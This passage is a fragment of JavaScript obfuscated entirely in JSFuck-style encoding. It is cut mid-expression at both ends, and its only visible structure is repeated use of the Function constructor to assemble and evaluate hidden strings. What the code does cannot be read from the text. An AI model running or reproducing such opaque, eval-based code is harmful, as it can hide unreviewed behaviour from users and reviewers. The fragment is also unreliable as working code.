(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+[]])+(+[![]]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+!+[]])+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+(+[![]]+[+(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]+[+!+[]]+[+[]]+[+[]]+[+[]])])[+!+[]+[+[]]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[